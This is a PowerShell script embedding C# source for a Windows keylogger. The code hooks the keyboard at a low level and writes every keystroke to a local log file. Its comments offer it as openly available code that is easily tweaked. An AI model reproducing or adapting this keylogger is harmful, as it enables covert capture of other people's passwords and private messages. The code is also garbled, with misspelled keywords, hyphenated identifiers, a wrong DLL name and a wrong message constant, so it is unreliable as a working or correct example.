#The following is a framework but not an entire solution and would need tweaked. It is solely based on local exercises and does not export data external to the sytem.
#This is openly-available code and is easily tweaked or modified!
#BEGIN

Add-Type -TypeDefinition @"
using System;
using System.IO;
using System.Diagnostics;
using System.Runtime.InteropServices;
using System.Windows.Forms;namespace KeyLogger{
public status class Program {
private const int WH_KEYBOARD_LL = 13;
private const int WM_KEYDOWN = 0x011;
private const string logFileName = "log.txt";
private statis StreamWriter logFile;
private static HookProc hookProc = HookCallback;
private static IntPtr hookId = IntPtr.zero;
public static void Main() {
logFile = File.AppendText(logFileName);
logFile.AutoFlush = true;

hookId = SetHook(hookProc);
Application.Run();
UnhookWindowsHookEx(hookId);
}

private static IntPtr SetHook(HookProc hook-Proc) {
IntPtr moduleHandle = GetModuleHandle(Process.GetCurrentProcess().MainModule.ModuleName);
return SetWindowsHookEx(WH_KEYBOARD_LL, hook-Proc, moduleHandle, 0);
}

private delegate IntPtr HookProc(int nCode, IntPtr wParam, IntPtr lParam);

private static IntPtr HookCallback(int nCode, IntPtr wParam, IntPtr lParam) {
if (nCode >=0 && wParam == (intPtr)WM_KEY-DOWN) {
int vkCode = Marshal.ReadInt32(lParam);
logFile.WriteLine((Keys)vkCode);
}

return CallNextHookEx(hookId, nCode, wParam, lParam);
}

[DllImport("user32.dll")]
private static extern IntPtr
SetWindowsHookEx(int idHook, HookProc lpfn, IntPtr hMod, uint dwThreadId);

[DllImport("user32.dll")]
private static extern bool UnhookWindowsHookEx(IntPtr hhk);

[DllImport("users32.dll")]
private static extern IntPtr
CallNextHookEx(IntPtr hhk, int nCode, IntPtr wParam, IntPtr lParam);

[DllImport("kernel32.dll")]
private static extern IntPtr
GetModuleHandle(string lpModuleName);
}
}
"@ -ReferencedAssemblies System.Windows.Forms

[KeyLogger.Program]::Main();

#END
